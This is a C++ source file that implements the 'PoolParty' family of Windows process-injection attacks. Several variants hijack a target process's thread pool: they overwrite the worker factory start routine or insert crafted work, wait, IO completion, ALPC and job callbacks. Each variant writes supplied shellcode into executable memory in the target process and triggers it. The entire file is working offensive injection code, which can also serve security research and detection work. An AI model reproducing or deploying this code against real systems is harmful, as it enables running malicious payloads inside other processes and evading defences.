#include "PoolParty.hpp"

PoolParty::PoolParty(DWORD dwTargetPid, unsigned char* cShellcode) {
	m_dwTargetPid = dwTargetPid;
	m_cShellcode = cShellcode;
	//m_szShellcodeSize = sizeof(cShellcode);
	//m_szShellcodeSize = 208; // TODO: Fix this disgusting issue
	m_szShellcodeSize = 224; // TODO: Fix this disgusting issue
}

// TODO: Reduce access rights
// TODO: Should logs be in the inject method?
std::shared_ptr<HANDLE> PoolParty::GetTargetProcessHandle() {
	auto p_hTargetPid = w_OpenProcess(PROCESS_ALL_ACCESS, FALSE, m_dwTargetPid);
	BOOST_LOG_TRIVIAL(info) << boost::format("Retrived handle to the target process: %x") % *p_hTargetPid;
	return p_hTargetPid;
}

std::shared_ptr<HANDLE> PoolParty::GetWorkerFactoryHandle() {
	WorkerFactoryHandleDuplicator Duplicator{ m_dwTargetPid, *m_p_hTargetPid };
	auto p_hWorkerFactory = Duplicator.Duplicate(WORKER_FACTORY_ALL_ACCESS);
	BOOST_LOG_TRIVIAL(info) << boost::format("Hijacked worker factory handle from the target process: %x") % *p_hWorkerFactory;
	return p_hWorkerFactory;
}

WORKER_FACTORY_BASIC_INFORMATION PoolParty::GetWorkerFactoryBasicInformation() {
	WORKER_FACTORY_BASIC_INFORMATION WorkerFactoryInformation = { 0 };
	w_NtQueryInformationWorkerFactory(*m_p_hWorkerFactory, (WORKERFACTORYINFOCLASS)WorkerFactoryBasicInformation, &WorkerFactoryInformation, sizeof(WorkerFactoryInformation), NULL);
	BOOST_LOG_TRIVIAL(info) << "Retrieved target worker factory basic information";
	return WorkerFactoryInformation;
}

LPVOID PoolParty::AllocateShellcodeMemory() {
	LPVOID ShellcodeAddress = AllocateMemory(*m_p_hTargetPid, m_szShellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	BOOST_LOG_TRIVIAL(info) << boost::format("Allocated shellcode memory in the target process: %p") % ShellcodeAddress;
	return ShellcodeAddress;
}

void PoolParty::WriteShellcode() {
	WriteMemory(*m_p_hTargetPid, m_ShellcodeAddress, m_cShellcode, m_szShellcodeSize);
	BOOST_LOG_TRIVIAL(info) << "Written shellcode to the target process";
}

void PoolParty::Inject() {
	BOOST_LOG_TRIVIAL(info) << boost::format("Starting PoolParty attack against process id: %d") % m_dwTargetPid;
	m_p_hTargetPid = this->GetTargetProcessHandle();
	m_p_hWorkerFactory = this->GetWorkerFactoryHandle();
	m_WorkerFactoryInformation = this->GetWorkerFactoryBasicInformation();
	m_ShellcodeAddress = this->AllocateShellcodeMemory();
	this->WriteShellcode();
	this->SetupExecution();
	BOOST_LOG_TRIVIAL(info) << "PoolParty attack completed successfully";
}

PoolParty::~PoolParty() 
{
}


/*
	Concrete PoolParty classes
*/

/* Worker factory start routine overwrite */

WorkerFactoryStartRoutineOverwrite::WorkerFactoryStartRoutineOverwrite(DWORD dwTargetPid, unsigned char* cShellcode)
	: PoolParty{ dwTargetPid, cShellcode }
{
}

LPVOID WorkerFactoryStartRoutineOverwrite::AllocateShellcodeMemory()
{
	/* 
		This execution primitive does not need to allocate memory, it writes to an already allocated memory
		So we just return a pointer to the allocate memory
	*/
	return m_WorkerFactoryInformation.StartRoutine; 
}


void WorkerFactoryStartRoutineOverwrite::SetupExecution()
{
	/* 
		Shellcode was already written to the target process's worker factory start routine
		We trigger execution of it by setting the minimum thread number 
	*/
	ULONG WorkerFactoryMinimumThreadNumber = m_WorkerFactoryInformation.TotalWorkerCount + 1;
	w_NtSetInformationWorkerFactory(*m_p_hWorkerFactory, WorkerFactoryThreadMinimum, &WorkerFactoryMinimumThreadNumber, sizeof(ULONG));
}

WorkerFactoryStartRoutineOverwrite::~WorkerFactoryStartRoutineOverwrite()
{
}


/* Remote work item insertion variant */

RemoteWorkItemInsertion::RemoteWorkItemInsertion(DWORD dwTargetPid, unsigned char* cShellcode) 
	: PoolParty{dwTargetPid, cShellcode} 
{
}

void RemoteWorkItemInsertion::SetupExecution() 
{
	/* Read the TP_POOL of the target process */
	auto Pool = ReadMemory<FULL_TP_POOL>(*m_p_hTargetPid, m_WorkerFactoryInformation.StartParameter);
	BOOST_LOG_TRIVIAL(info) << "Read target process's TP_POOL structure into the current process";

	auto TaskQueueHighPriorityList = &Pool->TaskQueue[TP_CALLBACK_PRIORITY_HIGH]->Queue;

	/* Allocate TP_WORK with a custom TP_POOL */
	auto pWorkItem = w_CreateThreadpoolWork((PTP_WORK_CALLBACK)m_ShellcodeAddress, NULL, NULL);
	BOOST_LOG_TRIVIAL(info) << "Created TP_WORK structure associated with the shellcode";

	/* 
		When a task is posted NTDLL would insert the task to the pool task queue list tail
		To avoid using WriteProcessMemory later on to post the task, we modify the work item's properties as if it was already "posted"
		In addition we make the work item exchangable so that ntdll!TppWorkerThread will process it correctly
	*/
	pWorkItem->CleanupGroupMember.Pool = (PFULL_TP_POOL)m_WorkerFactoryInformation.StartParameter;
	pWorkItem->Task.ListEntry.Flink = TaskQueueHighPriorityList;
	pWorkItem->Task.ListEntry.Blink = TaskQueueHighPriorityList;
	pWorkItem->WorkState.Exchange = 0x2;
	BOOST_LOG_TRIVIAL(info) << "Modified the TP_WORK structure to be associated with target process's TP_POOL";

	/* Write the specially crafted work item to the target process address space */
	auto RemoteWorkItemAddress = (PFULL_TP_WORK)AllocateMemory(*m_p_hTargetPid, sizeof(FULL_TP_WORK), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	BOOST_LOG_TRIVIAL(info) << boost::format("Allocated TP_WORK memory in the target process: %p") % RemoteWorkItemAddress;
	WriteMemory(*m_p_hTargetPid, RemoteWorkItemAddress, pWorkItem, sizeof(FULL_TP_WORK));
	BOOST_LOG_TRIVIAL(info) << "Written the specially crafted TP_WORK structure to the target process";

	/* To complete posting the work item we need to complete the task queue list insertion by modifying the pool side */
	auto RemoteWorkItemTaskList = &RemoteWorkItemAddress->Task.ListEntry;
	WriteMemory(*m_p_hTargetPid, &Pool->TaskQueue[TP_CALLBACK_PRIORITY_HIGH]->Queue.Flink, &RemoteWorkItemTaskList, sizeof(RemoteWorkItemTaskList));
	WriteMemory(*m_p_hTargetPid, &Pool->TaskQueue[TP_CALLBACK_PRIORITY_HIGH]->Queue.Blink, &RemoteWorkItemTaskList, sizeof(RemoteWorkItemTaskList));
	BOOST_LOG_TRIVIAL(info) << "Modified the target process's TP_POOL task queue list entry to point to the specially crafted TP_WORK";
}

RemoteWorkItemInsertion::~RemoteWorkItemInsertion() 
{
}


/* Remote wait callback insertion variant */

RemoteWaitCallbackInsertion::RemoteWaitCallbackInsertion(DWORD dwTargetPid, unsigned char* cShellcode)
	: PoolParty{ dwTargetPid, cShellcode }
{
}

void RemoteWaitCallbackInsertion::SetupExecution()
{
	/* Read the TP_POOL of the target process */
	auto Pool = ReadMemory<FULL_TP_POOL>(*m_p_hTargetPid, m_WorkerFactoryInformation.StartParameter);

	/* Duplicate the IoCompletion port handle associated with the target worker factory */
	auto p_hIoCompletion = w_DuplicateHandle(*m_p_hTargetPid, Pool->CompletionPort, GetCurrentProcess(), NULL, FALSE, DUPLICATE_SAME_ACCESS);

	/* Create thread pool wait */
	auto pWait = w_CreateThreadpoolWait((PTP_WAIT_CALLBACK)m_ShellcodeAddress, NULL, NULL);

	/* Write wait and direct structures into the target process */
	auto RemoteWaitAddress = (PFULL_TP_WAIT)AllocateMemory(*m_p_hTargetPid, sizeof(FULL_TP_WAIT), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	WriteMemory(*m_p_hTargetPid, RemoteWaitAddress, pWait, sizeof(FULL_TP_WAIT));

	auto RemoteDirectAddress = (PTP_DIRECT)AllocateMemory(*m_p_hTargetPid, sizeof(TP_DIRECT), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	WriteMemory(*m_p_hTargetPid, RemoteDirectAddress, &pWait->Direct, sizeof(TP_DIRECT));

	/* Create dispatcher object */
	auto p_hEvent = w_CreateEvent(NULL, FALSE, FALSE, NULL);

	/* Associate dispatcher object with the worker factory IO completion port */
	w_ZwAssociateWaitCompletionPacket(pWait->WaitPkt, *p_hIoCompletion, *p_hEvent, RemoteDirectAddress, RemoteWaitAddress, 0, 0, NULL);

	/* Trigger dispatcher object making NtWaitForWorkViaWorkerFactory receiving our specially crafted wait & direct */
	// TODO: Should it be a wrapper?
	SetEvent(*p_hEvent);
}

RemoteWaitCallbackInsertion::~RemoteWaitCallbackInsertion()
{
}


/* Remote IO completion callback insertion variant */

RemoteIoCompletionCallbackInsertion::RemoteIoCompletionCallbackInsertion(DWORD dwTargetPid, unsigned char* cShellcode)
	: PoolParty{ dwTargetPid, cShellcode }
{
}

void RemoteIoCompletionCallbackInsertion::SetupExecution()
{
	/* Read the TP_POOL of the target process */
	auto Pool = ReadMemory<FULL_TP_POOL>(*m_p_hTargetPid, m_WorkerFactoryInformation.StartParameter);

	/* Duplicate the IoCompletion port handle associated with the target worker factory */
	auto p_hIoCompletion = w_DuplicateHandle(*m_p_hTargetPid, Pool->CompletionPort, GetCurrentProcess(), NULL, FALSE, DUPLICATE_SAME_ACCESS);

	/* Create the file to associate with the IO completion */
	auto p_hFile = w_CreateFile(L"PoolParty_Invitation.txt", GENERIC_WRITE, NULL, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED, NULL);

	/* Create a TP_IO */
	auto pTpIo = w_CreateThreadpoolIo(*p_hFile, (PTP_WIN32_IO_CALLBACK)m_ShellcodeAddress, NULL, NULL);

	// TODO: Should be filled by w_CreateThreadpoolIo
	pTpIo->CleanupGroupMember.Callback = m_ShellcodeAddress;

	/* Start async IO operation */
	++pTpIo->PendingIrpCount;

	/* Write the TP_IO to the target process */
	auto RemoteIoAddress = (PFULL_TP_IO)AllocateMemory(*m_p_hTargetPid, sizeof(FULL_TP_IO), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	WriteMemory(*m_p_hTargetPid, RemoteIoAddress, pTpIo, sizeof(FULL_TP_IO)); 

	/* De-associate the file from its original IO completion and re-associate it with the IO completion of the target worker factory */
	IO_STATUS_BLOCK IoStatusBlock{ 0 };
	FILE_COMPLETION_INFORMATION FileIoCopmletionInformation = { 0 };
	FileIoCopmletionInformation.Port = *p_hIoCompletion;
	FileIoCopmletionInformation.Key = &RemoteIoAddress->Direct;
	w_ZwSetInformationFile(*p_hFile, &IoStatusBlock, &FileIoCopmletionInformation, sizeof(FILE_COMPLETION_INFORMATION), 61); // TODO: Export 0x3D to enum

	/* Trigger execution */
	// TODO: Use std::string instead of C char
	char cBuffer[] =
		"Dive right in and make a splash,\n"
		"We're throwing a pool party in a flash!\n"
		"Bring your swimsuits and sunscreen galore,\n"
		"We'll turn up the heat and let the good times pour!\n";
	auto szBufferLength = strlen(cBuffer);
	OVERLAPPED Overlapped = { 0 };
	w_WriteFile(*p_hFile, cBuffer, szBufferLength, NULL, &Overlapped);
}

RemoteIoCompletionCallbackInsertion::~RemoteIoCompletionCallbackInsertion()
{
}

/* Remote ALPC callback insertion variant */

RemoteAlpcCallbackInsertion::RemoteAlpcCallbackInsertion(DWORD dwTargetPid, unsigned char* cShellcode)
	: PoolParty{ dwTargetPid, cShellcode }
{
}

// TODO: Add RAII wrappers for resource creation functions

void RemoteAlpcCallbackInsertion::SetupExecution() 
{
	/* Read the TP_POOL of the target process */
	auto Pool = ReadMemory<FULL_TP_POOL>(*m_p_hTargetPid, m_WorkerFactoryInformation.StartParameter);
	
	/* Duplicate the IoCompletion port handle associated with the target worker factory */
	auto p_hIoCompletion = w_DuplicateHandle(*m_p_hTargetPid, Pool->CompletionPort, GetCurrentProcess(), NULL, FALSE, DUPLICATE_SAME_ACCESS);
	
	/* 
		Since we can not re-set the ALPC object IO completion port, we are creating a temporary ALPC object that will only be used to allocate a TP_ALPC structure
	*/
	auto hTempAlpcConnectionPort = w_NtAlpcCreatePort(NULL, NULL);

	/* 
		ntdll!TpAllocAlpcCompletion would set the ALPC object's IO copmletion port and associate it itself with the local pool's worker factory IO copmletion port
		We can not avoid calling ntdll!TpAllocAlpcCompletion as it is the easiest way to allocate a valid TP_ALPC structure
		So we just use a temp ALPC object to help us allocate the TP_ALPC structure
		we will later on modify the TP_ALPC to contain a new ALPC object, associated with the target's worker factory IO completion port
	*/
	auto pTpAlpc = w_TpAllocAlpcCompletion(hTempAlpcConnectionPort, (PTP_ALPC_CALLBACK)m_ShellcodeAddress, NULL, NULL);

	/* Create an ALPC object that does not have an IO copmletion port already set */

	UNICODE_STRING usAlpcPortName = INIT_UNICODE_STRING(POOL_PARTY_ALPC_PORT_NAME);

	OBJECT_ATTRIBUTES AlpcObjectAttributes = { 0 };
	AlpcObjectAttributes.Length = sizeof(OBJECT_ATTRIBUTES);
	AlpcObjectAttributes.ObjectName = &usAlpcPortName;

	ALPC_PORT_ATTRIBUTES AlpcPortAttributes = { 0 };
	AlpcPortAttributes.Flags = 0x20000;
	AlpcPortAttributes.MaxMessageLength = 328;

	auto hAlpcConnectionPort = w_NtAlpcCreatePort(&AlpcObjectAttributes, &AlpcPortAttributes);
	pTpAlpc->AlpcPort = hAlpcConnectionPort;
	
	/* Write the TP_ALPC to the target process */
	auto RemoteTpAlpcAddress = (PFULL_TP_ALPC)AllocateMemory(*m_p_hTargetPid, sizeof(FULL_TP_ALPC), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	WriteMemory(*m_p_hTargetPid, RemoteTpAlpcAddress, pTpAlpc, sizeof(FULL_TP_ALPC));
	
	/* Associate the ALPC object with the IO completion of the target worker factory */
	ALPC_PORT_ASSOCIATE_COMPLETION_PORT AlpcPortAssociateCopmletionPort = { 0 };
	AlpcPortAssociateCopmletionPort.CompletionKey = RemoteTpAlpcAddress;
	AlpcPortAssociateCopmletionPort.CompletionPort = *p_hIoCompletion;
	w_NtAlpcSetInformation(hAlpcConnectionPort, 2, &AlpcPortAssociateCopmletionPort, sizeof(ALPC_PORT_ASSOCIATE_COMPLETION_PORT)); // TODO:  Export 2 to enum
	
	/* Trigger execution by connecting to the ALPC object */
	OBJECT_ATTRIBUTES AlpcClientObjectAttributes = { 0 };
	AlpcClientObjectAttributes.Length = sizeof(OBJECT_ATTRIBUTES);

	std::string Buffer =
		"Dive right in and make a splash,\n"
		"We're throwing a pool party in a flash!\n"
		"Bring your swimsuits and sunscreen galore,\n"
		"We'll turn up the heat and let the good times pour!\n";
	auto BufferLength = Buffer.length();

	ALPC_MESSAGE ClientAlpcPortMessage = { 0 };
	ClientAlpcPortMessage.PortHeader.u1.s1.DataLength = BufferLength;
	ClientAlpcPortMessage.PortHeader.u1.s1.TotalLength = sizeof(PORT_MESSAGE) + BufferLength;
	std::copy(Buffer.begin(), Buffer.end(), ClientAlpcPortMessage.PortMessage);

	auto szClientAlpcPortMessage = sizeof(ALPC_MESSAGE);

	/* ntdll!NtAlpcConnectPort would block forever if not used with timeout, we set timeout to 1 second */
	LARGE_INTEGER liTimeout = { 0 };
	liTimeout.QuadPart = -10000000;

	auto hAlpcCommunicationPort = w_NtAlpcConnectPort(
		&usAlpcPortName,
		&AlpcClientObjectAttributes,
		&AlpcPortAttributes,
		0x20000,
		NULL,
		(PPORT_MESSAGE)&ClientAlpcPortMessage,
		&szClientAlpcPortMessage,
		NULL,
		NULL,
		&liTimeout
	);
}

RemoteAlpcCallbackInsertion::~RemoteAlpcCallbackInsertion()
{
}

/* Remote job notification callback insertion variant */

RemoteJobCallbackInsertion::RemoteJobCallbackInsertion(DWORD dwTargetPid, unsigned char* cShellcode)
	: PoolParty{ dwTargetPid, cShellcode }
{
}

void RemoteJobCallbackInsertion::SetupExecution() {

	/* Read the TP_POOL of the target process */
	auto Pool = ReadMemory<FULL_TP_POOL>(*m_p_hTargetPid, m_WorkerFactoryInformation.StartParameter);

	/* Duplicate the IoCompletion port handle associated with the target worker factory */
	auto p_hIoCompletion = w_DuplicateHandle(*m_p_hTargetPid, Pool->CompletionPort, GetCurrentProcess(), NULL, FALSE, DUPLICATE_SAME_ACCESS);

	/* Create a job object */
	auto p_hJob = w_CreateJobObject(NULL, NULL);

	/* Allocate TP_JOB */
	auto pTpJob = w_TpAllocJobNotification(*p_hJob, m_ShellcodeAddress, NULL, NULL);

	/* Write the TP_JOB to the target process */
	auto RemoteTpJobAddress = (PFULL_TP_JOB)AllocateMemory(*m_p_hTargetPid, sizeof(FULL_TP_JOB), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	WriteMemory(*m_p_hTargetPid, RemoteTpJobAddress, pTpJob, sizeof(FULL_TP_JOB));

	/* Zero out the IO completion port information of the job object */
	JOBOBJECT_ASSOCIATE_COMPLETION_PORT JobAssociateCopmletionPort = { 0 };

	w_SetInformationJobObject(*p_hJob, JobObjectAssociateCompletionPortInformation, &JobAssociateCopmletionPort, sizeof(JOBOBJECT_ASSOCIATE_COMPLETION_PORT));

	/* Associate the job object with the IO completion of the target worker factory */
	JobAssociateCopmletionPort.CompletionKey = RemoteTpJobAddress;
	JobAssociateCopmletionPort.CompletionPort = *p_hIoCompletion;

	w_SetInformationJobObject(*p_hJob, JobObjectAssociateCompletionPortInformation, &JobAssociateCopmletionPort, sizeof(JOBOBJECT_ASSOCIATE_COMPLETION_PORT));

	/* Trigger execution by adding a process to the job object */
	w_AssignProcessToJobObject(*p_hJob, GetCurrentProcess());

}

RemoteJobCallbackInsertion::~RemoteJobCallbackInsertion()
{
}
